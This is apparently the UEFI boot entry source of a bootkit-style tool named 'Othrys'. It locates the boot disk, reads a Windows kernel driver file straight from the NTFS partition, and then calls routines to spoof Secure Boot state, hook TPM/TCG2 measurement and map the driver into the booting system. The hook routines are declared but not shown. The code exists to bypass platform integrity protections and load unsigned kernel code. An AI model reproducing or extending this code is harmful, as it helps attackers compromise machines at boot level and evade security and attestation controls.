#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/DevicePathLib.h>
#include <Protocol/BlockIo.h>
#include <Protocol/LoadedImage.h>
#include "othrys_types.h"
#include "ntfs.h"
#include "peimage.h"

#define DRIVER_PATH L"\\Windows\\System32\\drivers\\target.sys"

EFI_STATUS InstallSecureBootSpoof(VOID);
EFI_STATUS InstallMapperHook(VOID *DriverData, UINT64 DriverSize);
EFI_STATUS InstallTcg2Hook(VOID);

static EFI_STATUS
FindBootDisk(EFI_BLOCK_IO_PROTOCOL **BlockIo)
{
    EFI_STATUS Status;
    UINTN      HandleCount;
    EFI_HANDLE *Handles;
    UINTN      i;

    Status = gBS->LocateHandleBuffer(ByProtocol, &gEfiBlockIoProtocolGuid, NULL, &HandleCount, &Handles);
    if (EFI_ERROR(Status)) return Status;

    for (i = 0; i < HandleCount; i++) {
        Status = gBS->HandleProtocol(Handles[i], &gEfiBlockIoProtocolGuid, (VOID **)BlockIo);
        if (EFI_ERROR(Status)) continue;
        if (!(*BlockIo)->Media->LogicalPartition && (*BlockIo)->Media->MediaPresent) {
            FreePool(Handles);
            return EFI_SUCCESS;
        }
    }

    for (i = 0; i < HandleCount; i++) {
        Status = gBS->HandleProtocol(Handles[i], &gEfiBlockIoProtocolGuid, (VOID **)BlockIo);
        if (EFI_ERROR(Status)) continue;
        if ((*BlockIo)->Media->MediaPresent && (*BlockIo)->Media->BlockSize >= 512) {
            FreePool(Handles);
            return EFI_SUCCESS;
        }
    }

    FreePool(Handles);
    return EFI_NOT_FOUND;
}

EFI_STATUS
EFIAPI
OthrysBootEntry(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_STATUS    Status;
    EFI_BLOCK_IO *BlockIo;
    NTFS_CONTEXT  NtfsCtx;
    VOID         *DriverData = NULL;
    UINT64        DriverSize = 0;
    UINT32        PartitionLba;

    Status = FindBootDisk(&BlockIo);
    if (EFI_ERROR(Status)) return Status;

    Status = FindNtfsPartition(BlockIo, &PartitionLba);
    if (EFI_ERROR(Status)) return Status;

    Status = NtfsInit(&NtfsCtx, BlockIo, PartitionLba);
    if (EFI_ERROR(Status)) return Status;

    Status = NtfsReadFile(&NtfsCtx, DRIVER_PATH, &DriverData, &DriverSize);
    if (EFI_ERROR(Status)) {
        NtfsCleanup(&NtfsCtx);
        return Status;
    }

    NtfsCleanup(&NtfsCtx);

    Status = InstallSecureBootSpoof();
    if (EFI_ERROR(Status)) {
        if (DriverData) FreePool(DriverData);
        return Status;
    }

    InstallTcg2Hook();

    Status = InstallMapperHook(DriverData, DriverSize);
    if (EFI_ERROR(Status)) {
        if (DriverData) FreePool(DriverData);
        return Status;
    }

    return EFI_SUCCESS;
}